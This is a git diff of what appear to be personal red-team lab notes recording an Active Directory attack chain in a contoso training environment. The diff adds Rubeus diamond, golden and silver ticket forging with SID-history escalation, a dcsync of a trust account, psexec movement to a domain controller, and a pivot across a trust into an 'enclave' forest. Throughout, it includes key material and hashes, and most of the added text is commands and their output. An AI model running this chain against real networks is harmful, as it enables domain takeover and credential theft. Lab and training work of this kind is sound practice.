@@ -220,4 +220,59 @@ beacon> dcsync dublin.contoso.com
 
 SID of parent domain: S-1-5-21-1076548718-1118529210-2193484809
 
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids: S-1-5-21-1076548718-1118529210-2193484809-512 /krbkey: /nowrap
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids: S-1-5-21-1076548718-1118529210-2193484809-512 /krbkey:ab41d2c550af7cc84b40fd3b69daeab67e1662f7bf662fd1572dd1fa9e949a56 /nowrap
+
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-1076548718-1118529210-2193484809-519 /krbkey:ab41d2c550af7cc84b40fd3b69daeab67e1662f7bf662fd1572dd1fa9e949a56 /nowrap
+
+
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-2958544638-1589230383-838459903 /sids:S-1-5-21-1076548718-1118529210-2193484809-519 /aes256:ab41d2c550af7cc84b40fd3b69daeab67e1662f7bf662fd1572dd1fa9e949a56 /outfile:C:\Users\Attacker\Desktop\golden
+
+[04/30 19:42:29] beacon> make_token CONTOSO\Administrator FakePass
+...
+[04/30 19:42:29] [+] Impersonated CONTOSO\Administrator (netonly)
+[04/30 19:42:51] beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\golden.kirbi
+[04/30 19:51:44] beacon> jump psexec64 lon-dc-1 
+nice now we have SYSTEM on lon-dc-1! now we just gotta pivot to enclave
+
+***********
+
+ngreen has access to enclave, lets see what we can do
+5f3002aef1f33d298af68ac8a081780b
+25307799aa98581a28d00e42b34b37eab0909c098d9f1c68a1569d7fe21c09e9
+
+lets check our inbound access
+beacon> ldapsearch (objectClass=trustedDomain)
+    name: contoso.enclave
+    objectGUID: 65ff35c2-1c26-486f-87fe-c04d009c1649
+    securityIdentifier: (null)
+    trustDirection: 1
+    trustPartner: contoso.enclave
+    trustPosixOffset: 0
+    trustType: 2
+    trustAttributes: 8
+    flatName: ENCLAVE
+
+now lets see whos in the container
+[04/30 19:58:52] beacon> ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname contoso.enclave --dn DC=contoso,DC=enclave
+cn: S-1-5-21-1076548718-1118529210-2193484809-2601
+confirms that nikki green is in enclave access group!
+
+[04/30 20:16:17] beacon> krb_asktgt /user:ngreen /aes256:25307799aa98581a28d00e42b34b37eab0909c098d9f1c68a1569d7fe21c09e9
+[04/30 20:17:23] beacon> krb_asktgs /service:krbtgt/contoso.enclave /ticket:doIFm...
+[04/30 20:18:45] beacon> krb_asktgs /service:cifs/enc-fs-1.contoso.enclave /targetdomain:contoso.enclave /dc:enc-dc-1.contoso.enclave /ticket:doIF...
+
+
+
+[04/30 20:01:28] beacon> dcsync contoso.com CONTOSO\ENCLAVE$
+Hash NTLM: d1003fd1448f136b91465bc0081f6a53
+
+PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:ngreen /domain:CONTOSO.COM /sid:S-1-5-21-1076548718-1118529210-21934848097 /id:3601 /groups:513,1106,2601 /service:krbtgt/contoso.enclave /rc4:d1003fd1448f136b91465bc0081f6a53 /nowrap
+
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/enc-jmp-1.contoso.enclave /dc:enc-dc-1.contoso.enclave /ticket: /nowrap
+
+--------------------
+sAMAccountName: ENC-DC-1$
+--------------------
+sAMAccountName: ENC-FS-1$
+--------------------
+sAMAccountName: ENC-JMP-1$
